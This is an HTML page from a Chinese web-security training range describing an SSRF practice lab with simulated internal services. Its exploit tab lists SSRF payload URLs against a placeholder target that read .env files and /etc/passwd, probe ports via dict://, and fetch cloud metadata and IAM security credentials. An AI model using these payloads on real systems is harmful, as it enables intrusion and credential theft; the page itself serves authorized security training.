<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>SSRF内网靶机 - ZhaoSec 靶场 · 朝闻道</title>
    <link rel="stylesheet" href="../assets/css/all.min.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        :root {
            --primary: #1e3c72;
            --accent: #2c7da0;
            --accent-soft: #eaf4fa;
            --text-primary: #0f2c3f;
            --text-secondary: #4a627a;
            --text-muted: #6f8aac;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f4f7fc;
            min-height: 100vh;
        }

        .module-wrap {
            max-width: 1280px;
            margin: 0 auto;
            padding: 0 1.5rem 3rem;
        }

        .module-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 0 1.5rem;
            margin-bottom: 1.5rem;
            border-bottom: 1px solid rgba(44, 125, 160, 0.15);
        }

        .module-nav .back-home {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 0.9rem;
            font-weight: 600;
            color: var(--accent);
            text-decoration: none;
            background: var(--accent-soft);
            padding: 8px 18px;
            border-radius: 40px;
            transition: all 0.2s ease;
        }

        .module-nav .back-home:hover {
            background: var(--accent);
            color: #fff;
            transform: translateX(-2px);
        }

        .module-nav .module-crumb {
            color: var(--text-muted);
            font-size: 0.9rem;
            font-weight: 500;
        }

        .module-nav .module-crumb i {
            color: var(--accent);
            margin-right: 6px;
        }

        .module-hero {
            display: grid;
            grid-template-columns: 1fr auto;
            gap: 2rem;
            padding: 2.5rem;
            margin-bottom: 2rem;
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border-radius: 28px;
            box-shadow: 0 12px 24px -12px rgba(0, 0, 0, 0.06);
            border: 1px solid rgba(44, 125, 160, 0.12);
            align-items: center;
        }

        .hero-left {
            text-align: left;
        }

        .hero-icon {
            font-size: 3rem;
            width: 72px;
            height: 72px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, var(--accent-soft), #d6eaf3);
            border-radius: 20px;
            margin-bottom: 1rem;
            color: var(--accent);
        }

        .module-hero h1 {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--primary), #2b4c7c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
            margin-bottom: 0.5rem;
        }

        .hero-desc {
            font-size: 1rem;
            color: var(--text-secondary);
            font-weight: 400;
            line-height: 1.6;
        }

        .hero-info {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            background: linear-gradient(135deg, var(--accent-soft), #f0f7fb);
            padding: 1.25rem 1.5rem;
            border-radius: 16px;
            min-width: 280px;
        }

        .hero-info-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 6px 0;
            border-bottom: 1px dashed rgba(44, 125, 160, 0.2);
        }

        .hero-info-item:last-child {
            border-bottom: none;
        }

        .hero-info-item strong {
            color: var(--text-secondary);
            font-weight: 500;
            font-size: 0.85rem;
        }

        .hero-info-item span {
            color: var(--primary);
            font-weight: 600;
            font-family: 'Fira Code', Consolas, monospace;
            font-size: 0.82rem;
        }

        .section-title {
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--primary);
            margin: 0 0 1.25rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section-title i {
            color: var(--accent);
        }

        .card-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 1.25rem;
            margin-bottom: 2.5rem;
        }

        .target-card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 8px 24px -12px rgba(0, 0, 0, 0.08);
            border: 1px solid rgba(44, 125, 160, 0.12);
            transition: all 0.3s ease;
        }

        .target-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 16px 32px -16px rgba(30, 60, 114, 0.15);
            border-color: rgba(44, 125, 160, 0.3);
        }

        .target-header {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white;
            padding: 1.25rem 1.5rem;
            position: relative;
            overflow: hidden;
        }

        .target-header::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -20%;
            width: 80px;
            height: 80px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .target-header h4 {
            margin: 0;
            font-size: 1.1rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .target-body {
            padding: 1.25rem 1.5rem;
        }

        .service-item {
            margin-bottom: 1rem;
        }

        .service-item:last-child {
            margin-bottom: 0;
        }

        .service-label {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--accent);
            margin-bottom: 0.4rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .service-label i {
            font-size: 0.8rem;
        }

        .service-item p {
            color: var(--text-primary);
            font-family: 'Fira Code', Consolas, monospace;
            background: var(--accent-soft);
            padding: 6px 10px;
            border-radius: 6px;
            margin: 0;
            font-size: 0.82rem;
            word-break: break-all;
            display: inline-block;
        }

        .service-item ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .service-item ul li {
            padding: 4px 10px;
            background: #f0f7fb;
            color: var(--text-primary);
            font-size: 0.8rem;
            border-radius: 6px;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .service-item ul li::before {
            content: '\f0a9';
            font-family: 'Font Awesome 6 Free';
            font-weight: 900;
            color: var(--accent);
            font-size: 0.65rem;
        }

        .port-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            background: var(--accent);
            color: white;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 0.72rem;
            font-weight: 600;
            margin-left: 8px;
        }

        .exploit-section {
            background: white;
            border-radius: 20px;
            padding: 1.5rem;
            box-shadow: 0 8px 24px -12px rgba(0, 0, 0, 0.08);
            border: 1px solid rgba(44, 125, 160, 0.12);
            margin-bottom: 2rem;
        }

        .nav-tabs-custom {
            border-bottom: 2px solid var(--accent-soft);
            margin-bottom: 1.25rem;
            display: flex;
            gap: 4px;
            overflow-x: auto;
        }

        .nav-tabs-custom .nav-link {
            color: var(--text-secondary);
            font-weight: 500;
            font-size: 0.88rem;
            padding: 8px 16px;
            border: none;
            background: transparent;
            border-radius: 10px 10px 0 0;
            transition: all 0.2s ease;
            white-space: nowrap;
        }

        .nav-tabs-custom .nav-link:hover {
            color: var(--accent);
            background: var(--accent-soft);
        }

        .nav-tabs-custom .nav-link.active {
            color: var(--accent);
            background: var(--accent-soft);
            font-weight: 600;
        }

        .nav-tabs-custom .nav-link i {
            margin-right: 6px;
        }

        .tab-content-custom {
            background: linear-gradient(135deg, #1e2a3a, #2c3e50);
            border-radius: 14px;
            padding: 1rem 1.25rem;
            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.3);
        }

        .tab-content-custom h4 {
            color: #7dd3fc;
            font-size: 0.95rem;
            font-weight: 600;
            margin: 0 0 0.75rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .tab-content-custom h4 i {
            color: #38bdf8;
        }

        .exploit-code {
            background: rgba(0, 0, 0, 0.3);
            border: none;
            border-radius: 10px;
            padding: 0.875rem 1rem;
            font-family: 'Fira Code', Consolas, monospace;
            font-size: 0.82rem;
            line-height: 1.6;
            color: #e0e7ef;
            overflow-x: auto;
            margin: 0;
            white-space: pre;
        }

        .safety-banner {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: linear-gradient(135deg, #fef3c7, #fde68a);
            border-radius: 14px;
            padding: 1rem 1.25rem;
            color: #92400e;
            font-size: 0.9rem;
            font-weight: 500;
            margin-bottom: 2rem;
            box-shadow: 0 4px 12px -6px rgba(234, 179, 8, 0.3);
        }

        .safety-banner i {
            color: #d97706;
            font-size: 1.1rem;
        }

        .module-footer {
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid rgba(44, 125, 160, 0.15);
            text-align: center;
            color: var(--text-muted);
            font-size: 0.85rem;
        }

        @media (max-width: 768px) {
            .module-hero {
                grid-template-columns: 1fr;
                gap: 1.25rem;
                padding: 1.5rem;
            }

            .hero-info {
                min-width: auto;
            }

            .module-hero h1 {
                font-size: 1.5rem;
            }

            .card-grid {
                grid-template-columns: 1fr;
            }

            .module-nav {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }

            .nav-tabs-custom {
                flex-wrap: nowrap;
            }
        }
    </style>
</head>
<body>
    <div class="module-wrap">
        <div class="module-nav">
            <a href="index.php" class="back-home"><i class="fas fa-list"></i> 返回关卡列表</a>
            <div class="module-crumb"><i class="fas fa-shield-alt"></i> SSRF漏洞 · 内网靶机</div>
        </div>

        <div class="module-hero">
            <div class="hero-left">
                <div class="hero-icon"><i class="fas fa-network-wired"></i></div>
                <h1>SSRF 内网靶机</h1>
                <div class="hero-desc">模拟内网服务和云服务数据获取场景，包含多个虚拟服务节点，用于练习 SSRF 漏洞的利用和防御技术</div>
            </div>
            <div class="hero-info">
                <div class="hero-info-item">
                    <strong>网络段</strong>
                    <span>127.0.0.0/8</span>
                </div>
                <div class="hero-info-item">
                    <strong>内部Web</strong>
                    <span>127.0.0.1:10010</span>
                </div>
                <div class="hero-info-item">
                    <strong>文件服务</strong>
                    <span>127.0.0.1:10013</span>
                </div>
                <div class="hero-info-item">
                    <strong>云元数据</strong>
                    <span>/metadata.php</span>
                </div>
                <div class="hero-info-item">
                    <strong>Flag服务</strong>
                    <span>/flag.php</span>
                </div>
            </div>
        </div>

        <div class="safety-banner">
            <i class="fas fa-shield-halved"></i>
            <span>仅限授权测试，请勿用于非法用途。启动后请确保防火墙限制外部访问。</span>
        </div>

        <h3 class="section-title"><i class="fas fa-server"></i> 内网服务列表</h3>
        <div class="card-grid">
            <div class="target-card">
                <div class="target-header">
                    <h4><i class="fas fa-cogs"></i> 内部管理系统</h4>
                </div>
                <div class="target-body">
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-link"></i> 服务地址</div>
                        <p>http://127.0.0.1:10010/</p>
                        <span class="port-badge"><i class="fas fa-plug"></i> 10010</span>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-list-check"></i> 功能</div>
                        <ul>
                            <li>系统信息</li>
                            <li>用户信息</li>
                            <li>敏感配置</li>
                            <li>Flag获取</li>
                        </ul>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-route"></i> 访问路径</div>
                        <ul>
                            <li>/</li>
                            <li>/?page=admin</li>
                            <li>/?page=flag</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="target-card">
                <div class="target-header">
                    <h4><i class="fas fa-folder-open"></i> 文件服务器</h4>
                </div>
                <div class="target-body">
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-link"></i> 服务地址</div>
                        <p>http://127.0.0.1:10013/</p>
                        <span class="port-badge"><i class="fas fa-plug"></i> 10013</span>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-list-check"></i> 功能</div>
                        <ul>
                            <li>文件浏览</li>
                            <li>敏感文件</li>
                            <li>配置泄露</li>
                            <li>Flag获取</li>
                        </ul>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-file"></i> 可访问文件</div>
                        <ul>
                            <li>.env</li>
                            <li>flag.txt</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="target-card">
                <div class="target-header">
                    <h4><i class="fas fa-cloud"></i> 云服务数据</h4>
                </div>
                <div class="target-body">
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-link"></i> 服务地址</div>
                        <p>http://127.0.0.1:10010/metadata.php</p>
                        <span class="port-badge"><i class="fas fa-plug"></i> 10010</span>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-list-check"></i> 功能</div>
                        <ul>
                            <li>AWS元数据</li>
                            <li>阿里云元数据</li>
                            <li>云凭证</li>
                            <li>Flag获取</li>
                        </ul>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-route"></i> 访问路径</div>
                        <ul>
                            <li>/metadata.php</li>
                            <li>模拟169.254</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="target-card">
                <div class="target-header">
                    <h4><i class="fas fa-flag-checkered"></i> Flag获取服务</h4>
                </div>
                <div class="target-body">
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-link"></i> 服务地址</div>
                        <p>http://127.0.0.1:10010/flag.php</p>
                        <span class="port-badge"><i class="fas fa-plug"></i> 10010</span>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-list-check"></i> 功能</div>
                        <ul>
                            <li>GET请求</li>
                            <li>POST请求</li>
                            <li>参数化Flag</li>
                            <li>多种类型</li>
                        </ul>
                    </div>
                    <div class="service-item">
                        <div class="service-label"><i class="fas fa-route"></i> 访问路径</div>
                        <ul>
                            <li>/flag.php</li>
                            <li>?type=admin</li>
                            <li>POST请求</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div class="exploit-section">
            <h3 class="section-title"><i class="fas fa-terminal"></i> 利用示例</h3>
            <ul class="nav nav-tabs nav-tabs-custom" role="tablist">
                <li class="nav-item">
                    <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#tab-1" type="button"><i class="fas fa-1"></i>内部管理系统</button>
                </li>
                <li class="nav-item">
                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-2" type="button"><i class="fas fa-2"></i>文件服务器</button>
                </li>
                <li class="nav-item">
                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-3" type="button"><i class="fas fa-3"></i>file://协议</button>
                </li>
                <li class="nav-item">
                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-4" type="button"><i class="fas fa-4"></i>dict://协议</button>
                </li>
                <li class="nav-item">
                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-5" type="button"><i class="fas fa-5"></i>云服务数据</button>
                </li>
                <li class="nav-item">
                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-6" type="button"><i class="fas fa-6"></i>Flag服务</button>
                </li>
            </ul>
            <div class="tab-content mt-3">
                <div class="tab-pane fade show active" id="tab-1">
                    <div class="tab-content-custom">
                        <h4><i class="fas fa-cogs"></i> 访问内部管理系统获取Flag</h4>
                        <pre class="exploit-code"># 使用SSRF访问内部管理系统
http://target.com/ssrf.php?url=http://127.0.0.1:10010/

# 获取Flag
http://target.com/ssrf.php?url=http://127.0.0.1:10010/?page=flag</pre>
                    </div>
                </div>
                <div class="tab-pane fade" id="tab-2">
                    <div class="tab-content-custom">
                        <h4><i class="fas fa-folder-open"></i> 访问文件服务器读取敏感文件</h4>
                        <pre class="exploit-code"># 读取环境配置
http://target.com/ssrf.php?url=http://127.0.0.1:10013/.env

# 读取Flag
http://target.com/ssrf.php?url=http://127.0.0.1:10013/flag.txt</pre>
                    </div>
                </div>
                <div class="tab-pane fade" id="tab-3">
                    <div class="tab-content-custom">
                        <h4><i class="fas fa-file-lock"></i> 利用 file:// 协议读取本地文件</h4>
                        <pre class="exploit-code"># 读取本地文件
http://target.com/ssrf.php?url=file:///etc/passwd
http://target.com/ssrf.php?url=file:///var/www/html/.env</pre>
                    </div>
                </div>
                <div class="tab-pane fade" id="tab-4">
                    <div class="tab-content-custom">
                        <h4><i class="fas fa-database"></i> 利用 dict:// 协议探测端口</h4>
                        <pre class="exploit-code"># 探测端口
http://target.com/ssrf.php?url=dict://127.0.0.1:10010:80/INFO
http://target.com/ssrf.php?url=dict://127.0.0.1:10013:80/INFO</pre>
                    </div>
                </div>
                <div class="tab-pane fade" id="tab-5">
                    <div class="tab-content-custom">
                        <h4><i class="fas fa-cloud"></i> 访问云服务元数据</h4>
                        <pre class="exploit-code"># 访问云服务元数据
http://target.com/ssrf.php?url=http://127.0.0.1:10010/metadata.php

# 模拟AWS元数据
http://target.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/

# 获取云服务凭证
http://target.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</pre>
                    </div>
                </div>
                <div class="tab-pane fade" id="tab-6">
                    <div class="tab-content-custom">
                        <h4><i class="fas fa-flag-checkered"></i> 访问Flag获取服务</h4>
                        <pre class="exploit-code"># GET请求获取基础Flag
http://target.com/ssrf.php?url=http://127.0.0.1:10010/flag.php

# GET请求获取管理员Flag
http://target.com/ssrf.php?url=http://127.0.0.1:10010/flag.php?type=admin

# 发送POST请求获取Flag
POST /ssrf.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1:10010/flag.php&data=username=admin&password=admin123</pre>
                    </div>
                </div>
            </div>
        </div>

        <div class="module-footer">
            <i class="fas fa-graduation-cap"></i> ZhaoSec Web安全靶场 · 朝闻道 · 仅供安全学习与授权测试
        </div>
    </div>

    <script src="../assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>
